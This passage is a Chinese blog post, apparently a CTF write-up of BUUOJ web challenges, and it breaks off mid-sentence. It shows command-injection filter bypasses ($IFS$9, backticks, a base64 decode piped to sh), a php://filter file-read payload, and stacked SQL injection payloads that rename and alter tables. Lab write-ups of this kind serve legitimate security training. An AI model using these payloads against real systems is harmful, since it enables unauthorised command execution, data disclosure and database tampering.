

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/chongqing.jpg">
  <link rel="icon" href="/img/chongqing.jpg">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="sangnigege">
  <meta name="keywords" content="一个做事不将就的人，阻止他的只有时间">
  
    <meta name="description" content="[GXYCTF2019]Ping Ping Ping命令执行漏洞   过滤空格  这里我们找到RCE的过滤空格，然后不断尝试（还没尝试完就放弃了，不应该） 然后用$IFS绕过空格，发现过滤flag  然后用拼接法绕过，过程中发现$IFS影响命令执行，改为$IFS$9  这种一般带着&lt;?php，需要查看源代码 出flag  还可以内联执行 内联函数：将指定的函数体插入并取代每一处调用该函数的地">
<meta property="og:type" content="article">
<meta property="og:title" content="buuoj WP1">
<meta property="og:url" content="http://example.com/2025/07/13/Buuoj_WP1/index.html">
<meta property="og:site_name" content="重庆森林不在重庆">
<meta property="og:description" content="[GXYCTF2019]Ping Ping Ping命令执行漏洞   过滤空格  这里我们找到RCE的过滤空格，然后不断尝试（还没尝试完就放弃了，不应该） 然后用$IFS绕过空格，发现过滤flag  然后用拼接法绕过，过程中发现$IFS影响命令执行，改为$IFS$9  这种一般带着&lt;?php，需要查看源代码 出flag  还可以内联执行 内联函数：将指定的函数体插入并取代每一处调用该函数的地">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503312119720.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503312119677.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503312120110.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503312122663.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503312123992.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503312127003.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503312129280.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022117798.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022119924.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022120157.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022121250.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022123535.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022126835.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022127752.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022128613.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022130945.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504030948144.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504030846726.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504030857579.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504030857176.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504030901747.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504030903703.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504030915097.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504030921262.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022151079.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022153399.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022154077.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022154277.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022203755.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022206825.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504081742786.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504081743341.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504081744223.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504081746204.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504081749775.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504081754969.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504081755427.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504081759078.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504081800050.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504082245019.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504082246259.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504082311468.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504082330602.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504082330838.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504082339180.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504082333991.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504082335148.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504090005083.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091045621.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091045167.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091046076.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091047662.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091050747.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091052133.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091053575.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091054674.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091551756.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091102922.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091546105.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091556862.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504091552337.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504101523649.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504101529058.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504101534419.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504101537385.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504101541228.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504101544505.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102123817.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102125651.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102128835.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102128640.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102129429.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102149539.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102150414.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102154133.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102207781.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102208344.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102219346.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102219700.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504102219093.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502172135777.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502172139618.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502172142000.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502172200665.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502172203504.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502172205493.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502172205629.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502202035758.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502202041756.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502202049527.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502202054474.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502202057536.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502202104824.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502202114458.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502202115467.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503041425216.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503032334787.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503032338264.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503032339128.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503032351202.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503040004698.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503041424811.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502252248659.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502252250857.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502252251501.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502252342616.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502260003232.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502260005977.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502260007741.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502260020801.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502261145038.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502261201178.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502262040223.png">
<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202502262024402.png">
<meta property="article:published_time" content="2025-07-13T14:35:00.000Z">
<meta property="article:modified_time" content="2025-07-13T15:51:12.112Z">
<meta property="article:author" content="sangnigege">
<meta property="article:tag" content="buuoj">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503312119720.png">
  
  
  
  <title>buuoj WP1 - 重庆森林不在重庆</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"TKccC2BvrQ0jKroA5aUdv8tr-gzGzoHsz","app_key":"rSHs3EnI9lT7nQwv5J7fcBnq","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  

  

  

  

  

  
    
  



  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>重庆森林不在重庆</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/" target="_self">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="buuoj WP1"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-07-13 22:35" pubdate>
          2025年7月13日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          9.3k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          78 分钟
        
      </span>
    

    
    
      
        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="leancloud-page-views"></span> 次
        </span>
        
      
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">buuoj WP1</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h1><p>命令执行漏洞</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503312119720.png" srcset="/img/loading.gif" lazyload alt="image-20250331211912616"></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503312119677.png" srcset="/img/loading.gif" lazyload alt="image-20250331211943612"></p>
<p>过滤空格</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503312120110.png" srcset="/img/loading.gif" lazyload alt="image-20250331212011067"></p>
<p>这里我们找到RCE的过滤空格，然后不断尝试（还没尝试完就放弃了，不应该）</p>
<p>然后用<code>$IFS</code>绕过空格，发现过滤<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503312122663.png" srcset="/img/loading.gif" lazyload alt="image-20250331212220624"></p>
<p>然后用拼接法绕过，过程中发现<code>$IFS</code>影响命令执行，改为<code>$IFS$9</code></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503312123992.png" srcset="/img/loading.gif" lazyload alt="image-20250331212353283"></p>
<p>这种一般带着<code>&lt;?php</code>，需要查看源代码</p>
<p>出flag</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503312127003.png" srcset="/img/loading.gif" lazyload alt="image-20250331212701956"></p>
<p>还可以内联执行</p>
<p>内联函数：将指定的函数体插入并取代每一处调用该函数的地方。</p>
<p>反引号在linux中作为内联执行，执行输出结果。也就是说</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> `<span class="hljs-built_in">ls</span>` //执行<span class="hljs-built_in">ls</span>输出index.php和flag.php,然后再执行<span class="hljs-built_in">cat</span> flag.php;<span class="hljs-built_in">cat</span> index.php<br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202503312129280.png" srcset="/img/loading.gif" lazyload alt="image-20250331212949091"></p>
<p>sh命令来执行</p>
<p>使用 base64 编码的方式来绕过 flag 过滤。</p>
<p>加密命令<code>echo “cat flag.php” | base64</code>；</p>
<p>解密命令并执行<code>echo Y2F0IGZsYWcucGhwCg== | base64 -d | sh</code></p>
<p>然后用<code>$IFS$9</code>代替空格。</p>
<h1 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h1><p>一进来就要找秘密</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022117798.png" srcset="/img/loading.gif" lazyload alt="image-20250402211745650"></p>
<p>看人名也没啥谐音，估计是恶搞，暂时没啥有用的</p>
<p>右键查看源代码</p>
<p>发现<code>/Archive_room.php</code></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022119924.png" srcset="/img/loading.gif" lazyload alt="image-20250402211928840"></p>
<p>进去以后是秘密</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022120157.png" srcset="/img/loading.gif" lazyload alt="image-20250402212025497"></p>
<p>点开后跳转到<code>/end.php</code>，然后显示没看清么？回去再仔细看看吧。</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022121250.png" srcset="/img/loading.gif" lazyload alt="image-20250402212122119"></p>
<p>这里查看<code>/Archive_room.php</code>的源代码，</p>
<p>发现查看秘密应该跳到<code>/action.php</code>，但是我们却跳转到<code>/end.php</code>，应该是302跳转</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022123535.png" srcset="/img/loading.gif" lazyload alt="image-20250402212321480"></p>
<p>所以我们这里用curl访问（curl默认不跟随重定向，bp也可以做到）</p>
<p>让我们访问<code>secr3t.php</code></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022126835.png" srcset="/img/loading.gif" lazyload alt="image-20250402212611770"></p>
<p>进去后提示去<code>/flag.php</code></p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022127752.png" srcset="/img/loading.gif" lazyload alt="image-20250402212723694"></p>
<p>访问<code>/flag.php</code>后，不显示flag</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022128613.png" srcset="/img/loading.gif" lazyload alt="image-20250402212806573"></p>
<p>找到了但是看不到，此时又想到了PHP的封装协议，我们用一下 [ACTF2020 新生赛]Include里面使用的方法</p>
<p>构造payload: <code>/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php</code></p>
<p>解码，出flag</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504022130945.png" srcset="/img/loading.gif" lazyload alt="image-20250402213021891"></p>
<h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><p>可以查数据，加单引号会有报错</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504030948144.png" srcset="/img/loading.gif" lazyload alt="image-20250403094810030"></p>
<p><code>1&#39; union select 1#</code></p>
<p>出现过滤，而且是大小写不敏感的，union注入不好使了。</p>
<p>实际上我们还有报错，但是因为过滤，常规报错注入也不好使</p>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504030846726.png" srcset="/img/loading.gif" lazyload alt="image-20250403084647325"></p>
<p>和[SUCTF 2019]EasySQL一样，这里竟然用堆叠注入，这是我没想到的，一直以为堆叠注入不会考</p>
<p>实际上堆叠注入没那么简单，也可以考的挺难</p>
<p>这里用<code>show</code>来代替<code>select</code></p>
<p>先通过show databases爆出数据库。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">0</span><span class="hljs-string">&#x27;; show databases; #</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504030857579.png" srcset="/img/loading.gif" lazyload alt="image-20250403085725310"></p>
<p>然后用 show tables 尝试爆表。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">0</span><span class="hljs-string">&#x27;; show tables; #</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504030857176.png" srcset="/img/loading.gif" lazyload alt="image-20250403085754975"></p>
<p>可以看到这里有两个表，我们先尝试爆words表的内容。</p>
<p>实际上，这里本来就是查的words表的内容，</p>
<p>也就是我们输入<code>1</code>就是查的words表中<code>id</code>为1的<code>data</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">0</span><span class="hljs-string">&#x27;; show columns from words; #</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504030901747.png" srcset="/img/loading.gif" lazyload alt="image-20250403090146566"></p>
<p>然后爆表 1919810931114514 的内容。</p>
<p>这里学到一个新知识点，表名为数字时，要用反引号包起来查询。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">0</span><span class="hljs-string">&#x27;; show columns from `1919810931114514`; #</span><br></code></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504030903703.png" srcset="/img/loading.gif" lazyload alt="image-20250403090315538"></p>
<p>可以发现爆出来了flag字段，然而因为过滤，常规方法对于flag毫无办法</p>
<p>这里有三个思路</p>
<p>第一个，</p>
<ol>
<li><p>通过 rename 先把 words 表改名为其他的表名(word1)。</p>
</li>
<li><p>把 1919810931114514 表的名字改为 words 。</p>
</li>
<li><p>给新 words 表添加新的列名 id 。</p>
</li>
<li><p>将 flag 改名为 data 。</p>
</li>
</ol>
<p>之所以这么做，因为这里我们默认查的是words表，所以我们把1919810931114514 表改的像words 表，这样输入1就可以出flag了</p>
<pre><code class="hljs">1&#39;; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#
</code></pre>
<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202504030915097.png" srcset="/img/loading.gif" lazyload alt="image-20250403091459926"></p>
<p>第二个，</p>
<p>因为select被过滤了，所以先将</p>
